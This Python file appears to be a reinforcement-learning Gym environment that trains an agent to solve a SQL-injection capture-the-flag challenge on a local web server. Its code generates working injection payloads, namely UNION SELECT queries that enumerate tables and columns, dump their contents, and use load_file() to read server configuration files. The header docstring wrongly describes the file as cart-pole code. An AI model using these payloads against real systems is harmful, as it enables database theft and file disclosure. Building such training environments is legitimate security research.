"""
Copy of a copy: This was copied from https://raw.github.uio.no/fabiomz/gym-qiscoin/master/qiscoin/envs/qiscoin_env.py
Classic cart-pole system implemented by Rich Sutton et al.
Copied from http://incompleteideas.net/sutton/book/code/pole.c
permalink: https://perma.cc/C9ZM-652R
"""

import sys,os
sys.path.append(os.path.join(os.path.dirname(__file__), '../../'))
import re

import gym
from gym.utils import seeding
from ctfsql.env.core import GameState, GameNotRunningError

import numpy as np
import requests
from bs4 import BeautifulSoup
import mysql.connector
import const
import generate_actions


class CTFSQLEnv(gym.Env):
    """
    Description:
        A webserver exposing a query with a potential SQL injection vulnerability. Behind the vulnerability lies a flag.
    Observation:
        Type: MiltiDiscrete(3)
        Num    Observation
        0   action tried and returned a negative answer
        1   action never tried
        2   action tried and returned a positive answer
    Actions:
        Type: Discrete(n)
        Num    Action
        n    SQL statement n
    Reward:
        +100 for capturing the flag, -1 in all the other cases.
    Starting State:
        Webserver initialized with a random query. No action tested.
    Episode Termination:
        Capture the flag.
    """

    def __init__(self):
        self.query_reward = const.QUERY_REWARD
        self.flag_reward = const.FLAG_REWARD

        self._process = None
        self.done = False
        self.verbose = False
        if(self.verbose): print('Game setup with a random query')

        self.seed()
        self.state = GameState()
        self.viewer = None
        self.max_score = 10
        self.auto_reset = False
        #self.steps_beyond_done = None

    def close(self) -> None:
        if self.game_running:
            self._process = None

    def load(self, ulx_file: str) -> None:
        self.close()  # Terminate existing process if needed.

    @property
    def game_running(self) -> bool:
        """ Determines if the game is still running. """
        return self._process is not None

    def seed(self, seed=None):
        self.np_random, seed = seeding.np_random(seed)
        return [seed]


    def step(self, command_id, command):
        # if(self.verbose): print('I received action {0}'.format(command))

        if not self.game_running:
            raise GameNotRunningError()

        self.state.done = False
        self.state.last_command = command.strip()
        self.state.last_command_id = command_id
        self.is_admissible_commands['table'] = False
        self.is_admissible_commands['column'] = False
        self.is_admissible_commands['set_input_form'] = False

        # Process action
        description = ''
        if ',pass,' in command:
            split_command = command.split(',pass,')
            x = requests.post(self.url, data = {'id': split_command[0], 'pw': split_command[1]})
        else:
            x = requests.post(self.url, data = {'id': command, 'pw': ''})
        self.state.infos['responce_data'] = x
        if x.status_code == self.responce_success:
            obs = self.regex_feedback_url(x.text)
            if command in obs:
                description = 'Responce is good but Query is syntactically wrong.'
            elif 'FLAG_' in obs:
                description = 'You got the flag. Game Clear!'
                self.state.done = True
                self.is_admissible_commands['table'] = False
                self.is_admissible_commands['column'] = False
                self.is_admissible_commands['input_form'] = False
                self.is_admissible_commands['file_path'] = False
            elif 'you want to read the Flag' in obs:
                description = 'You achieved phpinfo data.'
                self.is_admissible_commands['table'] = False
                self.is_admissible_commands['column'] = False
                self.is_admissible_commands['input_form'] = False
                if not self.state.set_file_path:
                    self.is_admissible_commands['file_path'] = True
            elif ',pass,' in command:
                description = 'You did not achieve phpinfo data.'
            elif 'load_file' in command:
                description = 'Not found the file_path.'
            elif 'seccon' in obs:
                description = 'Successfully get the critical info in the database.'
                self.is_admissible_commands['table'] = False
                self.is_admissible_commands['column'] = False
                if not self.state.set_input_form:
                    self.is_admissible_commands['input_form'] = True
            elif 'COLUMNS' in obs and 'COLUMN_PRIVILEGES' in obs:
                description = 'Successfully get table names in the database.'
                if not self.state.get_table_name:
                    self.is_admissible_commands['table'] = True
            elif command_id >= self.action_len and 'id' in obs:
                description = 'Successfully get column names in the table.'
                if not self.state.get_column_name:
                    self.is_admissible_commands['column'] = True
            elif command_id >= self.syntaxmin and command_id < self.syntaxmax:
                description = 'Correct exploratory action for the escape.'
        else:
            obs = None
            if (command_id >= self.syntaxmin and command_id < self.syntaxmax):
                description = 'Correct exploratory action for the escape but the column is wrong.'
            else:
                description = 'Server responce error.'

        self.state.score = self.flag_reward if self.state.done else self.query_reward
        self.state.infos = {
            'admissible_commands': self.admissible_commands(obs),
            'inventory': self.inventory(),
            'description': description,
            'won': self.state.done,
            'max_score': 100,
            'obs': obs,
            'responce_data': x,
            'status_code': x.status_code,
            'url': self.url,
        }

        return obs, self.state.score, self.state.done, self.state.infos

    def reset(self):
        self.close() # Terminate existing process if needed.
        self._process = True

        # Action space
        self.action_space = generate_actions.generate_actions()
        self.action_len = len(generate_actions.generate_actions())

        # init ctf database by escape type
        self.escape_type = np.random.randint(const.MAX_ESC_TYPE)
        self.column_type = np.random.randint(const.MIN_COLUMN_TYPE, const.MAX_COLUMN_TYPE)
        # self.db_config = const.db_config
        # self.init_database()

        # Get the ip address of ctf envirnoment
        self.url = const.URL + 'ctf_{0}/ctf_{0}_{1}.php'.format(self.escape_type + 1, self.column_type)
        self.responce_success = const.RESONCE_SUCCESS

        # Get the set of actions that are syntactically correct
        self.syntaxmin = 0 + self.escape_type * 11
        self.syntaxmax = 10 + self.escape_type * 11

        # global session
        session = requests.Session()
        x = session.get(self.url)
        obs = self.regex_feedback_url(x.text)
        self.state.table_info = {}
        self.state.get_table_name = False
        self.state.get_column_name = False
        self.state.set_input_form = False
        self.state.set_file_path = False
        self.is_admissible_commands = {
            'table': False,
            'column': False,
            'input_form': False,
            'file_path': False
        }

        self.state.infos = {
            'admissible_commands': self.action_space,
            'inventory': self.inventory(),
            'description': 'Try SQL injection and get the flag',
            'won': False,
            'max_score': 100,
            'obs': obs,
            'responce_data': x,
            'status_code': x.status_code,
            'url': self.url,
        }
        return obs, self.state.infos

    def init_database(self):
        try:
            db = mysql.connector.connect(**self.db_config)
            query = 'INSERT INTO `users` (`id`, `loginid`, `password` ,`auth_bit`, `lasttime`, `comment`) VALUES (%s, %s, %s, %s, %s, %s)'
            if db.is_connected():
                cursor = db.cursor();
                cursor.execute('DROP TABLE IF EXISTS users')
                if self.escape_type <= 3:
                    cursor.execute("CREATE table users (id INT,loginid TEXT, password TEXT, auth_bit int, lasttime TIMESTAMP, comment TEXT)")
                    users_dataset = const.users_dataset_text
                else:
                    cursor.execute("CREATE table users (id INT,loginid INT, password TEXT, auth_bit int, lasttime TIMESTAMP, comment TEXT)")
                    users_dataset = const.users_dataset_int
                for user in users_dataset:
                    cursor.execute(query, user)
                    db.commit()

                if (self.verbose): print('Successfully init database')
            else:
                print('Failed to connect database')
                raise GameNotRunningError()
        except:
            print('Failed to set database up')
            raise GameNotRunningError()

    def admissible_commands(self, obs = None):
        if self.is_admissible_commands['table'] and obs is not None:
            escape = ["'", "')", '"', '")'][self.escape_type]
            base_column_query = "{0} UNION SELECT GROUP_CONCAT(column_name), {1} from INFORMATION_SCHEMA.columns where table_name = '{2}'; -- "
            column_num = (self.state.last_command_id + 4) % 11
            columns = "1"
            for i in range(2, column_num+2):
                columns = columns + "," + str(i)
            action_index = len(self.action_space)
            for table in obs.split(','):
                if ' ' not in table and table.islower():
                    command = base_column_query.format(escape, columns, table)
                    self.action_space.append(command)
                    self.state.table_info[action_index] = {'table': table, 'column_num': column_num, 'command': command}
                    action_index += 1

            self.state.get_table_name = True
            return self.action_space
        elif self.is_admissible_commands['column'] and obs is not None:
            content_type_encoding = self.state.infos['responce_data'].encoding if self.state.infos['responce_data'].encoding != 'ISO-8859-1' else None
            soup = BeautifulSoup(self.state.infos['responce_data'].content, 'html.parser', from_encoding=content_type_encoding)
            body_element = soup.find_all('body')
            paragraphs = []
            for element in body_element:
                paragraphs.append(str(element))
            text = self.regex_feedback_url(paragraphs[0])

            escape = ["'", "')", '"', '")'][self.escape_type]
            base_column_query = "{0} UNION SELECT GROUP_CONCAT(concat({1}), '<SEP>'), {2} from {3}; -- "
            table = self.state.table_info[self.state.last_command_id]['table']
            column_num = self.state.table_info[self.state.last_command_id]['column_num']
            columns = "1"
            for i in range(2, column_num+2):
                columns = columns + "," + str(i)
            for inputs in text.split():
                if ',' in inputs:
                    query = ''
                    for col in inputs.split(','):
                        if col.islower():
                            query = query + str(col) + ", ' ', "
                    command = base_column_query.format(escape, query[:-7], columns, table)
                    if command not in self.action_space:
                        self.action_space.append(command)

            self.state.get_column_name = False
            return self.action_space
        elif self.is_admissible_commands['input_form'] and obs is not None:
            input_lists = []
            for inputs in re.split('(SEP)',obs):
                if len(inputs.split()) == 7:
                    input_list = []
                    for input in inputs.split():
                        if not input.isdigit() \
                            and re.match('^[,](\d{1})$', input) is None \
                            and re.match('(\d{4})[/.-](\d{2})[/.-](\d{2})$', input) is None \
                            and re.match('(\d{2})[:](\d{2})[:](\d{2})$', input) is None:
                            input_list.append(input)
                    input_lists.append(input_list)

            for lists in input_lists:
                commands = []
                for i in range(2):
                    if i == 0:
                        for list in lists:
                            commands.append(list)
                    else:
                        for list in lists:
                            for command in commands:
                                if not list in command:
                                    command = command + ',pass,' + list
                                    if command not in self.action_space:
                                        self.action_space.append(command)

            self.state.set_input_form = True
            return self.action_space
        elif self.is_admissible_commands['file_path'] and obs is not None:
            escape = ["'", "')", '"', '")'][self.escape_type]
            file_pathes = [
                '/var/www/html/' + self.state.infos['url'][len(const.URL):],
                '/etc/httpd/conf/httpd.conf',
                '/etc/apache2/apache2.conf',
                '/user/share/nginx/html/' + self.state.infos['url'][len(const.URL):],
                '/etc/nginx/nginx.conf'
            ]
            columns = "1"
            for i in range(2, self.column_type):
                columns = columns + "," + str(i)
            base_column_query = "{0} UNION SELECT load_file('{1}'),{2}; -- "

            for file_path in file_pathes:
                command = base_column_query.format(escape, file_path, columns)
                if command not in self.action_space:
                    self.action_space.append(command)

            self.state.set_file_path = True
            return self.action_space
        else:
            return self.action_space

    def inventory(self):
        return []

    def regex_feedback_url(self, url_text):
        text = "a\u3000 b\t\nc\r\n"
        url_text = re.sub('[\<|\>|\/|\{|\}|\#|\\n]+', ' ', url_text)
        return url_text.join(text.splitlines())

    def render(self, mode='human'):
        return None
